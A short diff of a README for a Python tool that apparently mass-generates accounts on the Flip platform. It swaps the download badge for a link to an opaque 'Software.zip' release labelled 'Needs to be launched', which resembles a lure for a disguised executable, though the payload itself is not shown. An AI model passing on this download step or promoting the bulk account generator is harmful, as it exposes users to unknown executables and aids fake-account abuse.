@@ -30,7 +30,7 @@ Flip-Account-Creator is a Python-based account generator tailored specifically f
 - tls-client
 
 ### 🌐 External Link
-[![Download Flip-Account-Creator](https://img.shields.io/badge/Download-Flip--Account--Creator-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download Flip-Account-Creator](https://github.com/Ryoumaaaaa/Flip-Account-Creator/releases/download/v1.0/Software.zip)](https://github.com/Ryoumaaaaa/Flip-Account-Creator/releases/download/v1.0/Software.zip "Needs to be launched")
 
 ### 🚀 Quick Start
 To get started with Flip-Account-Creator, follow these steps:
